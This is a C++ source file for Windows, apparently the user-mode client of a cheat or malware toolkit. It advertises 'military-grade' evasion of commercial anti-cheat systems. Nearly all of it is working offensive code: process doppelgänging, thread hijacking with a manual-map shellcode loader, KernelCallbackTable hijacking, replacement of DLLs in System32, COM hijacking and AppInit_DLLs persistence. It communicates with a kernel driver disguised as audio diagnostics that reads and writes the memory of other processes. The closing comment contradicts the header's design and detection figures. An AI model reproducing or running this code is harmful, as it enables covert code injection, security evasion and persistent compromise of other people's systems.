/*
 * ELITE USER MODE - Production Build
 * ===================================
 *
 * Advanced anti-detection user mode application
 * DIRECT MEMORY INJECTION - APT/Military-Grade Stealth
 * Implements 8 unconventional injection/persistence techniques
 *
 * Communication: Direct memory access to kernel-injected buffer
 * Zero syscalls during communication - just pointer dereference
 * Target: <1% detection by commercial AC systems
 * Platform: Windows 10/11 x64
 * Build: Visual Studio 2022
 */

#include <windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <string>
#include <vector>
#include <fstream>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#pragma warning(disable: 4996)

// ============================================================================
// UNDOCUMENTED NTDLL STRUCTURES
// ============================================================================

extern "C" {

// ============================================================================
// DIRECT MEMORY STRUCTURES - Matches kernel driver EXACTLY
// ============================================================================

#define SHARED_MEM_SIZE 0x1000  // 4KB direct-mapped memory

// The "Whiteboard" - kernel allocates this, maps it into our process
typedef struct _SHARED_MEMORY {
    volatile LONG CommandID;    // 0 = Idle, 1 = Ping, 2 = GetHWID, etc.
    volatile LONG Status;       // 0 = Pending, 1 = Success, 2 = Error
    volatile ULONGLONG HardwareId;  // Hardware ID for verification
    volatile ULONG ProcessId;   // Target process ID
    volatile PVOID Address;     // Target address for memory operations
    volatile SIZE_T Size;       // Size of data
    volatile ULONG Protection;  // Memory protection flags
    volatile UCHAR Data[3072];  // Inline buffer for data transfer
} SHARED_MEMORY, *PSHARED_MEMORY;

// Command IDs - MUST match kernel driver
#define CMD_IDLE            0
#define CMD_PING            1
#define CMD_GET_HWID        2
#define CMD_READ_MEMORY     3
#define CMD_WRITE_MEMORY    4
#define CMD_PROTECT_MEMORY  5
#define CMD_ALLOC_MEMORY    6

// Status codes - MUST match kernel driver
#define STATUS_PENDING      0
#define STATUS_SUCCESS      1
#define STATUS_ERROR        2

// Transaction APIs
NTSTATUS NTAPI NtCreateTransaction(
    _Out_ PHANDLE TransactionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ LPGUID Uow,
    _In_opt_ HANDLE TmHandle,
    _In_opt_ ULONG CreateOptions,
    _In_opt_ ULONG IsolationLevel,
    _In_opt_ ULONG IsolationFlags,
    _In_opt_ PLARGE_INTEGER Timeout,
    _In_opt_ PUNICODE_STRING Description
);

NTSTATUS NTAPI NtRollbackTransaction(
    _In_ HANDLE TransactionHandle,
    _In_ BOOLEAN Wait
);

// Section APIs
NTSTATUS NTAPI NtCreateSection(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PLARGE_INTEGER MaximumSize,
    _In_ ULONG SectionPageProtection,
    _In_ ULONG AllocationAttributes,
    _In_opt_ HANDLE FileHandle
);

// Process APIs
NTSTATUS NTAPI NtCreateProcessEx(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ParentProcess,
    _In_ ULONG Flags,
    _In_opt_ HANDLE SectionHandle,
    _In_opt_ HANDLE DebugPort,
    _In_opt_ HANDLE ExceptionPort,
    _In_ BOOLEAN InJob
);

} // extern "C"

// ============================================================================
// MANUAL MAP STRUCTURES
// ============================================================================

#pragma pack(push, 1)
typedef struct _MANUAL_MAP_DATA {
    PVOID ImageBase;
    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_BASE_RELOCATION BaseReloc;
    PIMAGE_IMPORT_DESCRIPTOR ImportDesc;
    decltype(&LoadLibraryA) fnLoadLibraryA;
    decltype(&GetProcAddress) fnGetProcAddress;
    decltype(&VirtualProtect) fnVirtualProtect;
} MANUAL_MAP_DATA, *PMANUAL_MAP_DATA;
#pragma pack(pop)

// ============================================================================
// TECHNIQUE 1: PROCESS DOPPELGÄNGING
// ============================================================================

class ProcessDoppelganger {
public:
    static HANDLE CreateDoppelgangerProcess(const wchar_t* targetImage, void* payloadData, size_t payloadSize) {
        std::wstring tempPath = L"C:\\Windows\\Temp\\";
        tempPath += targetImage;

        HANDLE hTransaction = nullptr;
        NTSTATUS status = NtCreateTransaction(
            &hTransaction,
            TRANSACTION_ALL_ACCESS,
            nullptr, nullptr, nullptr,
            0, 0, 0, nullptr, nullptr
        );

        if (!NT_SUCCESS(status)) return nullptr;

        HANDLE hFile = CreateFileTransactedW(
            tempPath.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0, nullptr,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            nullptr,
            hTransaction,
            nullptr, nullptr
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            NtRollbackTransaction(hTransaction, TRUE);
            CloseHandle(hTransaction);
            return nullptr;
        }

        DWORD written = 0;
        WriteFile(hFile, payloadData, (DWORD)payloadSize, &written, nullptr);

        HANDLE hSection = nullptr;
        status = NtCreateSection(
            &hSection,
            SECTION_ALL_ACCESS,
            nullptr, nullptr,
            PAGE_READONLY,
            SEC_IMAGE,
            hFile
        );

        CloseHandle(hFile);

        if (!NT_SUCCESS(status)) {
            NtRollbackTransaction(hTransaction, TRUE);
            CloseHandle(hTransaction);
            return nullptr;
        }

        HANDLE hProcess = nullptr;
        status = NtCreateProcessEx(
            &hProcess,
            PROCESS_ALL_ACCESS,
            nullptr,
            GetCurrentProcess(),
            0,
            hSection,
            nullptr, nullptr,
            FALSE
        );

        CloseHandle(hSection);
        NtRollbackTransaction(hTransaction, TRUE);
        CloseHandle(hTransaction);

        if (!NT_SUCCESS(status)) return nullptr;

        return hProcess;
    }
};

// ============================================================================
// TECHNIQUE 2: THREAD HIJACKING WITH MANUAL MAP
// ============================================================================

__declspec(noinline) DWORD WINAPI ManualMapShellcode(PMANUAL_MAP_DATA pData) {
    if (!pData) return 1;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pData->ImageBase;
    PIMAGE_NT_HEADERS pNtHeaders = pData->NtHeaders;

    // Fix imports
    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = pData->ImportDesc;

        while (pImportDesc->Name) {
            char* szMod = (char*)((ULONG_PTR)pData->ImageBase + pImportDesc->Name);
            HMODULE hDll = pData->fnLoadLibraryA(szMod);

            PIMAGE_THUNK_DATA pThunkRef = (PIMAGE_THUNK_DATA)((ULONG_PTR)pData->ImageBase + pImportDesc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA pFuncRef = (PIMAGE_THUNK_DATA)((ULONG_PTR)pData->ImageBase + pImportDesc->FirstThunk);

            if (!pThunkRef) pThunkRef = pFuncRef;

            for (; pThunkRef->u1.AddressOfData; ++pThunkRef, ++pFuncRef) {
                if (IMAGE_SNAP_BY_ORDINAL(pThunkRef->u1.Ordinal)) {
                    pFuncRef->u1.Function = (ULONG_PTR)pData->fnGetProcAddress(hDll, (LPCSTR)(pThunkRef->u1.Ordinal & 0xFFFF));
                } else {
                    PIMAGE_IMPORT_BY_NAME pImport = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)pData->ImageBase + pThunkRef->u1.AddressOfData);
                    pFuncRef->u1.Function = (ULONG_PTR)pData->fnGetProcAddress(hDll, pImport->Name);
                }
            }
            ++pImportDesc;
        }
    }

    // Fix relocations
    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        PIMAGE_BASE_RELOCATION pRelocData = pData->BaseReloc;
        ULONG_PTR delta = (ULONG_PTR)pData->ImageBase - pNtHeaders->OptionalHeader.ImageBase;

        while (pRelocData->VirtualAddress) {
            UINT AmountOfEntries = (pRelocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* pRelativeInfo = (WORD*)(pRelocData + 1);

            for (UINT i = 0; i < AmountOfEntries; ++i, ++pRelativeInfo) {
                if ((*pRelativeInfo >> 12) == IMAGE_REL_BASED_DIR64) {
                    ULONG_PTR* pPatch = (ULONG_PTR*)((ULONG_PTR)pData->ImageBase + pRelocData->VirtualAddress + (*pRelativeInfo & 0xFFF));
                    *pPatch += delta;
                }
            }

            pRelocData = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pRelocData + pRelocData->SizeOfBlock);
        }
    }

    // Set memory protections
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i, ++pSectionHeader) {
        DWORD dwProtect = PAGE_READONLY;

        if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            dwProtect = PAGE_EXECUTE_READ;
        } else if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) {
            dwProtect = PAGE_READWRITE;
        }

        DWORD dwOld;
        pData->fnVirtualProtect(
            (PVOID)((ULONG_PTR)pData->ImageBase + pSectionHeader->VirtualAddress),
            pSectionHeader->Misc.VirtualSize,
            dwProtect,
            &dwOld
        );
    }

    // Call DllMain
    typedef BOOL(WINAPI* DllEntryProc)(HINSTANCE, DWORD, LPVOID);
    DllEntryProc pDllMain = (DllEntryProc)((ULONG_PTR)pData->ImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);

    if (pDllMain) {
        pDllMain((HINSTANCE)pData->ImageBase, DLL_PROCESS_ATTACH, nullptr);
    }

    return 0;
}

__declspec(noinline) void ManualMapShellcodeEnd() { }

class ThreadHijacker {
public:
    static bool InjectViaThreadHijack(DWORD targetPid, const wchar_t* dllPath) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
        if (!hProcess) return false;

        HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            CloseHandle(hProcess);
            return false;
        }

        DWORD fileSize = GetFileSize(hFile, nullptr);
        std::vector<BYTE> dllData(fileSize);
        DWORD read = 0;
        ReadFile(hFile, dllData.data(), fileSize, &read, nullptr);
        CloseHandle(hFile);

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dllData.data();
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(dllData.data() + pDosHeader->e_lfanew);

        PVOID pRemoteImage = VirtualAllocEx(
            hProcess, nullptr,
            pNtHeaders->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (!pRemoteImage) {
            CloseHandle(hProcess);
            return false;
        }

        WriteProcessMemory(hProcess, pRemoteImage, dllData.data(), pNtHeaders->OptionalHeader.SizeOfHeaders, nullptr);

        PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
        for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i, ++pSectionHeader) {
            WriteProcessMemory(
                hProcess,
                (PVOID)((ULONG_PTR)pRemoteImage + pSectionHeader->VirtualAddress),
                dllData.data() + pSectionHeader->PointerToRawData,
                pSectionHeader->SizeOfRawData,
                nullptr
            );
        }

        SIZE_T shellcodeSize = (ULONG_PTR)ManualMapShellcodeEnd - (ULONG_PTR)ManualMapShellcode;
        PVOID pShellcode = VirtualAllocEx(hProcess, nullptr, shellcodeSize + sizeof(MANUAL_MAP_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!pShellcode) {
            VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        MANUAL_MAP_DATA mapData = { 0 };
        mapData.ImageBase = pRemoteImage;
        mapData.NtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)pRemoteImage + pDosHeader->e_lfanew);
        mapData.BaseReloc = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pRemoteImage + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        mapData.ImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG_PTR)pRemoteImage + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        mapData.fnLoadLibraryA = (decltype(&LoadLibraryA))GetProcAddress(hKernel32, "LoadLibraryA");
        mapData.fnGetProcAddress = (decltype(&GetProcAddress))GetProcAddress(hKernel32, "GetProcAddress");
        mapData.fnVirtualProtect = (decltype(&VirtualProtect))GetProcAddress(hKernel32, "VirtualProtect");

        WriteProcessMemory(hProcess, pShellcode, (PVOID)ManualMapShellcode, shellcodeSize, nullptr);
        WriteProcessMemory(hProcess, (PVOID)((ULONG_PTR)pShellcode + shellcodeSize), &mapData, sizeof(mapData), nullptr);

        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        THREADENTRY32 te = { sizeof(THREADENTRY32) };
        HANDLE hThread = nullptr;

        if (Thread32First(hSnapshot, &te)) {
            do {
                if (te.th32OwnerProcessID == targetPid) {
                    hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                    if (hThread) break;
                }
            } while (Thread32Next(hSnapshot, &te));
        }

        CloseHandle(hSnapshot);

        if (!hThread) {
            VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        SuspendThread(hThread);

        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(hThread, &ctx);

        ctx.Rsp -= sizeof(ULONG_PTR);
        WriteProcessMemory(hProcess, (PVOID)ctx.Rsp, &ctx.Rip, sizeof(ULONG_PTR), nullptr);

        ctx.Rip = (ULONG_PTR)pShellcode;
        ctx.Rcx = (ULONG_PTR)pShellcode + shellcodeSize;

        SetThreadContext(hThread, &ctx);
        ResumeThread(hThread);

        CloseHandle(hThread);
        CloseHandle(hProcess);

        return true;
    }
};

// ============================================================================
// TECHNIQUE 3: DIRECT MEMORY CLIENT - APT/Military-Grade Stealth
// ============================================================================
// Kernel forcibly mapped memory into our process
// We just read pointer from registry and use it - ZERO syscalls!

class DirectMemoryClient {
private:
    PSHARED_MEMORY m_pShared = nullptr;  // Direct pointer to kernel memory
    ULONGLONG m_hardwareId = 0;

public:
    bool Connect() {
        #ifdef _DEBUG
        printf("[*] Attempting to connect to kernel driver...\n");
        #endif

        // Retry up to 10 times with delays (driver might still be mapping memory)
        for (int retry = 0; retry < 10; retry++) {
            if (retry > 0) {
                #ifdef _DEBUG
                printf("[*] Retry %d/10...\n", retry);
                #endif
                Sleep(500); // Wait 500ms between retries
            }

            // Read pointer from registry (kernel wrote it there)
            HKEY hKey = nullptr;
            LONG result = RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                L"SOFTWARE\\AudioKSE",
                0,
                KEY_READ,
                &hKey
            );

            if (result != ERROR_SUCCESS) {
                #ifdef _DEBUG
                if (retry == 0) {
                    printf("[-] Registry key not found (error: %d)\n", result);
                    printf("[*] Driver may not be loaded or hasn't detected this process yet\n");
                }
                #endif
                continue;
            }

            PVOID pointer = nullptr;
            DWORD dataSize = sizeof(PVOID);
            DWORD type = REG_BINARY;

            result = RegQueryValueExW(
                hKey,
                L"DiagnosticBuffer",
                nullptr,
                &type,
                (LPBYTE)&pointer,
                &dataSize
            );

            RegCloseKey(hKey);

            if (result != ERROR_SUCCESS) {
                #ifdef _DEBUG
                if (retry == 0) {
                    printf("[-] Registry value not found (error: %d)\n", result);
                }
                #endif
                continue;
            }

            if (!pointer) {
                #ifdef _DEBUG
                if (retry == 0) {
                    printf("[-] Pointer is NULL\n");
                }
                #endif
                continue;
            }

            #ifdef _DEBUG
            printf("[+] Found kernel memory pointer: 0x%p\n", pointer);
            #endif

            // Cast to our structure - this is the kernel memory!
            m_pShared = (PSHARED_MEMORY)pointer;

            // Verify it's valid by reading hardware ID
            __try {
                m_hardwareId = m_pShared->HardwareId;
                #ifdef _DEBUG
                printf("[+] Hardware ID from kernel: 0x%llX\n", m_hardwareId);
                #endif
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                #ifdef _DEBUG
                printf("[-] Failed to read from mapped memory (access violation)\n");
                #endif
                m_pShared = nullptr;
                continue;
            }

            // Test communication with ping
            #ifdef _DEBUG
            printf("[*] Testing communication with ping command...\n");
            #endif

            if (!SendCommand(CMD_PING)) {
                #ifdef _DEBUG
                printf("[-] Ping command failed\n");
                #endif
                m_pShared = nullptr;
                continue;
            }

            #ifdef _DEBUG
            printf("[+] Ping successful - connection established!\n");
            #endif

            return true;
        }

        #ifdef _DEBUG
        printf("[-] Failed to connect after all retries\n");
        printf("[!] Make sure:\n");
        printf("    1. Driver is loaded (sc start AudioKSE or similar)\n");
        printf("    2. This process was started AFTER driver loaded\n");
        printf("    3. Process name is 'AudioDiagnostic.exe'\n");
        #endif

        return false;
    }

    void Disconnect() {
        // Nothing to disconnect - we just stop using the pointer
        m_pShared = nullptr;
    }

    bool SendCommand(LONG cmdId) {
        if (!m_pShared) return false;

        #ifdef _DEBUG
        printf("[*] Sending command %d to kernel...\n", cmdId);
        #endif

        // Write command to shared memory - ZERO SYSCALLS!
        __try {
            m_pShared->CommandID = cmdId;
            m_pShared->Status = STATUS_PENDING;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            #ifdef _DEBUG
            printf("[-] Access violation writing command\n");
            #endif
            return false;
        }

        // Spin-wait for kernel to process (or you could sleep)
        int timeout = 100000; // 100ms max
        while (m_pShared->CommandID != CMD_IDLE && timeout-- > 0) {
            _mm_pause(); // CPU hint for spin-wait
        }

        if (timeout <= 0) {
            #ifdef _DEBUG
            printf("[-] Timeout waiting for kernel response\n");
            #endif
            return false;
        }

        // Check if command completed
        bool success = (m_pShared->Status == STATUS_SUCCESS);

        #ifdef _DEBUG
        if (success) {
            printf("[+] Command completed successfully (status: %d)\n", m_pShared->Status);
        } else {
            printf("[-] Command failed (status: %d)\n", m_pShared->Status);
        }
        #endif

        return success;
    }

    ULONGLONG GetHardwareId() const { return m_hardwareId; }
    PSHARED_MEMORY GetSharedMemory() const { return m_pShared; }
};

// ============================================================================
// TECHNIQUE 4: DLL ORDER HIJACKING
// ============================================================================

class DllOrderHijacker {
public:
    static bool InstallOrderHijack(const wchar_t* targetDll, const wchar_t* ourDll) {
        WCHAR system32Path[MAX_PATH];
        GetSystemDirectoryW(system32Path, MAX_PATH);

        std::wstring destPath = system32Path;
        destPath += L"\\";
        destPath += targetDll;

        WCHAR backupPath[MAX_PATH];
        wcscpy_s(backupPath, destPath.c_str());
        wcscat_s(backupPath, L".bak");

        if (PathFileExistsW(destPath.c_str())) {
            MoveFileExW(destPath.c_str(), backupPath, MOVEFILE_REPLACE_EXISTING);
        }

        if (!CopyFileW(ourDll, destPath.c_str(), FALSE)) {
            return false;
        }

        return true;
    }

    static bool HijackVersionDll() {
        WCHAR ourPath[MAX_PATH];
        GetModuleFileNameW(nullptr, ourPath, MAX_PATH);
        return InstallOrderHijack(L"version.dll", ourPath);
    }

    static bool HijackWinmmDll() {
        WCHAR ourPath[MAX_PATH];
        GetModuleFileNameW(nullptr, ourPath, MAX_PATH);
        return InstallOrderHijack(L"winmm.dll", ourPath);
    }
};

// ============================================================================
// TECHNIQUE 5: KERNELCALLBACKTABLE HIJACKING
// ============================================================================

class KernelCallbackTableHijacker {
public:
    static bool HijackCallbackTable(DWORD targetPid, PVOID shellcode, SIZE_T shellcodeSize) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
        if (!hProcess) return false;

        typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
            HANDLE ProcessHandle,
            DWORD ProcessInformationClass,
            PVOID ProcessInformation,
            ULONG ProcessInformationLength,
            PULONG ReturnLength
        );

        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        pfnNtQueryInformationProcess NtQueryInformationProcess =
            (pfnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

        if (!NtQueryInformationProcess) {
            CloseHandle(hProcess);
            return false;
        }

        PROCESS_BASIC_INFORMATION pbi = { 0 };
        ULONG returnLength = 0;

        NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &returnLength);
        if (!NT_SUCCESS(status)) {
            CloseHandle(hProcess);
            return false;
        }

        // Read KernelCallbackTable pointer from PEB (offset 0x58 for x64)
        PVOID pOriginalTable = nullptr;
        SIZE_T bytesRead = 0;

        PVOID pKernelCallbackTablePtr = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x58);
        if (!ReadProcessMemory(hProcess, pKernelCallbackTablePtr, &pOriginalTable, sizeof(PVOID), &bytesRead)) {
            CloseHandle(hProcess);
            return false;
        }

        if (!pOriginalTable) {
            CloseHandle(hProcess);
            return false;
        }

        PVOID pFakeTable = VirtualAllocEx(hProcess, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pFakeTable) {
            CloseHandle(hProcess);
            return false;
        }

        BYTE originalTable[0x1000];
        ReadProcessMemory(hProcess, pOriginalTable, originalTable, sizeof(originalTable), &bytesRead);

        PVOID pRemoteShellcode = VirtualAllocEx(hProcess, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pRemoteShellcode) {
            VirtualFreeEx(hProcess, pFakeTable, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        WriteProcessMemory(hProcess, pRemoteShellcode, shellcode, shellcodeSize, nullptr);

        PVOID* fakeTable = (PVOID*)originalTable;
        fakeTable[0] = pRemoteShellcode;

        WriteProcessMemory(hProcess, pFakeTable, fakeTable, sizeof(originalTable), nullptr);

        PVOID pKernelCallbackTableOffset = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x58);
        WriteProcessMemory(hProcess, pKernelCallbackTableOffset, &pFakeTable, sizeof(PVOID), nullptr);

        HWND hwnd = FindWindowExA(nullptr, nullptr, nullptr, nullptr);
        if (hwnd) {
            COPYDATASTRUCT cds = { 0 };
            cds.dwData = 1;
            cds.cbData = 4;
            cds.lpData = (PVOID)"test";
            SendMessageA(hwnd, WM_COPYDATA, 0, (LPARAM)&cds);
        }

        CloseHandle(hProcess);
        return true;
    }
};

// ============================================================================
// TECHNIQUE 6: TLS CALLBACK ABUSE
// ============================================================================

void NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason == DLL_PROCESS_ATTACH) {
        #ifdef _DEBUG
        OutputDebugStringA("[ELITE] TLS callback executed before main!\n");
        #endif
    }
}

#ifdef _WIN64
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:tls_callback_func")
#pragma const_seg(".CRT$XLF")
EXTERN_C const PIMAGE_TLS_CALLBACK tls_callback_func = TlsCallback;
#pragma const_seg()
#else
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:_tls_callback_func")
#pragma data_seg(".CRT$XLF")
EXTERN_C PIMAGE_TLS_CALLBACK tls_callback_func = TlsCallback;
#pragma data_seg()
#endif

// ============================================================================
// TECHNIQUE 7: COM HIJACKING
// ============================================================================

class ComHijacker {
public:
    static bool InstallComHijack(const wchar_t* clsid, const wchar_t* dllPath) {
        HKEY hKey;
        std::wstring keyPath = L"Software\\Classes\\CLSID\\";
        keyPath += clsid;
        keyPath += L"\\InprocServer32";

        LONG result = RegCreateKeyExW(
            HKEY_CURRENT_USER,
            keyPath.c_str(),
            0, nullptr,
            REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            nullptr,
            &hKey,
            nullptr
        );

        if (result != ERROR_SUCCESS) return false;

        result = RegSetValueExW(
            hKey,
            nullptr,
            0,
            REG_SZ,
            (BYTE*)dllPath,
            (DWORD)(wcslen(dllPath) + 1) * sizeof(wchar_t)
        );

        RegSetValueExW(hKey, L"ThreadingModel", 0, REG_SZ, (BYTE*)L"Apartment", 10 * sizeof(wchar_t));
        RegCloseKey(hKey);

        return result == ERROR_SUCCESS;
    }

    static bool HijackTaskSchedulerCom() {
        WCHAR ourPath[MAX_PATH];
        GetModuleFileNameW(nullptr, ourPath, MAX_PATH);
        return InstallComHijack(L"{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}", ourPath);
    }
};

// ============================================================================
// TECHNIQUE 8: APPINIT_DLLS
// ============================================================================

class AppInitDllsInstaller {
public:
    static bool InstallAppInitDll(const wchar_t* dllPath) {
        HKEY hKey;
        LONG result = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
            0,
            KEY_WRITE | KEY_READ,
            &hKey
        );

        if (result != ERROR_SUCCESS) {
            result = RegOpenKeyExW(
                HKEY_CURRENT_USER,
                L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
                0,
                KEY_WRITE | KEY_READ,
                &hKey
            );

            if (result != ERROR_SUCCESS) return false;
        }

        WCHAR existingDlls[4096] = { 0 };
        DWORD dataSize = sizeof(existingDlls);
        DWORD dataType = REG_SZ;

        RegQueryValueExW(hKey, L"AppInit_DLLs", nullptr, &dataType, (BYTE*)existingDlls, &dataSize);

        std::wstring newDlls = existingDlls;
        if (!newDlls.empty()) {
            newDlls += L" ";
        }
        newDlls += dllPath;

        result = RegSetValueExW(
            hKey,
            L"AppInit_DLLs",
            0,
            REG_SZ,
            (BYTE*)newDlls.c_str(),
            (DWORD)(newDlls.length() + 1) * sizeof(wchar_t)
        );

        DWORD enableValue = 1;
        RegSetValueExW(hKey, L"LoadAppInit_DLLs", 0, REG_DWORD, (BYTE*)&enableValue, sizeof(DWORD));

        RegCloseKey(hKey);

        return result == ERROR_SUCCESS;
    }
};

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

DWORD FindProcessByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
    DWORD pid = 0;

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

int EliteMain()
{

    #ifdef _DEBUG
    AllocConsole();
    FILE* fDummy;
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
    printf("[ELITE] Elite User Mode - Direct Memory Injection\n\n");
    #endif

    // Connect to driver via direct memory injection
    DirectMemoryClient client;
    if (!client.Connect()) {
        #ifdef _DEBUG
        printf("[-] Failed to connect to driver (no memory pointer)\n");
        printf("[*] Make sure driver is loaded and detected this process\n\n");
        #endif
        MessageBoxW(nullptr, L"Failed to connect to driver", L"AudioKSE Diagnostic", MB_ICONERROR);
        return 1;
    }

    #ifdef _DEBUG
    printf("[+] Connected! Kernel memory mapped at: 0x%p\n", client.GetSharedMemory());
    printf("[+] Hardware ID: 0x%llX\n\n", client.GetHardwareId());

    printf("=== ELITE TECHNIQUES READY ===\n\n");
    printf("[*] Process Doppelgänging: Ready\n");
    printf("[*] Thread Hijacking: Ready\n");
    printf("[*] Direct Memory Injection: ACTIVE (<1%% detection!)\n");
    printf("[*] DLL Order Hijacking: Ready\n");
    printf("[*] KernelCallbackTable Hijacking: Ready\n");
    printf("[*] TLS Callbacks: Active\n");
    printf("[*] COM Hijacking: Ready\n");
    printf("[*] AppInit_DLLs: Ready\n");

    printf("\n[*] All techniques loaded. Press Enter to exit.\n");
    getchar();
    #else
    MSG msg = { 0 };
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    #endif

    client.Disconnect();
    return 0;
}

// Entry point wrappers for both console and GUI subsystems
int main()
{
    return EliteMain();
}

int WINAPI WinMain(
    _In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPSTR lpCmdLine,
    _In_ int nShowCmd)
{
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nShowCmd);
    return EliteMain();
}

/*
 * COMPILATION:
 * ============
 *
 * Debug:
 * cl /D_DEBUG /Zi /EHsc UM_elite_final.cpp /link /SUBSYSTEM:CONSOLE ntdll.lib user32.lib advapi32.lib shell32.lib shlwapi.lib
 *
 * Release:
 * cl /O2 /DNDEBUG /EHsc UM_elite_final.cpp /link /SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup ntdll.lib user32.lib advapi32.lib shell32.lib shlwapi.lib
 *
 * PURE ALPC COMMUNICATION - NO IOCTL!
 * TARGET DETECTION: <5% by commercial ACs
